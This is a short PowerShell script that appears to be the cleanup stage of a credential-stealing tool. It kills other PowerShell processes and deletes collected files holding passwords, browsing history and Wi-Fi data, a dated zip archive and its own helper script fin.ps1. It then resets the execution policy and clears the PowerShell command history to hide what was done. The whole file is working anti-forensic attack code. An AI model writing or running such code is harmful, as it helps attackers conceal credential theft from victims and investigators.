Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process #Kill all powershell process except the one is running
Set-Location C:\Users\Public\Documents #Go to public documents location
#Delete information file
Remove-Item dust_passwords.txt
Remove-Item dust_history.txt
Remove-Item dust_wifi.txt
# Remove-Item dust_connected_devices.txt # no more used
Remove-Item "$env:UserDomain$(Get-Date -Format yyyymmdd).zip"
Remove-Item fin.ps1
Set-ExecutionPolicy restricted -Force #Reset script blocker
Clear-Content (Get-PSReadlineOption).HistorySavePath #Clear powershell command history
taskkill -F /IM powershell.exe #Kill all powershell process
